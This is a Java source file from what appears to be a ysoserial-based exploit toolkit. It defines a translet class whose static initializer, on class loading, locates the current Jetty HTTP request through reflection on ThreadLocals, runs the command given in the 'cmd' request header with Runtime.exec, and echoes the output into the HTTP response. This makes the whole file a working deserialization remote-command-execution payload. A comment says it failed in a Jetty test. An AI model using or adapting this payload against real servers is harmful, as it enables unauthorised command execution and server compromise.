package ysoserial;

import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;

// https://github.com/feihong-cs/Java-Rce-Echo/blob/master/Jetty/code/jetty9Echo.jsp
// 在Jetty测试失败
public class MyClassLoader5 extends AbstractTranslet {
    static {
        try{

            Class clazz = Thread.currentThread().getClass();
            java.lang.reflect.Field field = clazz.getDeclaredField("threadLocals");
            field.setAccessible(true);
            Object obj = field.get(Thread.currentThread());
            field = obj.getClass().getDeclaredField("table");
            field.setAccessible(true);
            obj = field.get(obj);
            Object[] obj_arr = (Object[]) obj;
            for(Object o : obj_arr){
                if(o == null) continue;
                field = o.getClass().getDeclaredField("value");
                field.setAccessible(true);
                obj = field.get(o);
                if(obj != null && obj.getClass().getName().endsWith("HttpConnection")){
                    java.lang.reflect.Method method = obj.getClass().getMethod("getHttpChannel");
                    Object httpChannel = method.invoke(obj);
                    method = httpChannel.getClass().getMethod("getRequest");
                    obj = method.invoke(httpChannel);
                    method = obj.getClass().getMethod("getHeader", String.class);
                    String cmd = (String)method.invoke(obj, "cmd");
                    if(cmd != null && !cmd.isEmpty()){
                        String res = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter("\\A").next();
                        method = httpChannel.getClass().getMethod("getResponse");
                        obj = method.invoke(httpChannel);
                        method = obj.getClass().getMethod("getWriter");
                        java.io.PrintWriter printWriter = (java.io.PrintWriter)method.invoke(obj);
                        printWriter.println(res);
                    }

                    break;
                }
            }

        }catch(Exception e){
            e.printStackTrace();
        }
    }

    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {

    }

    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {

    }
}
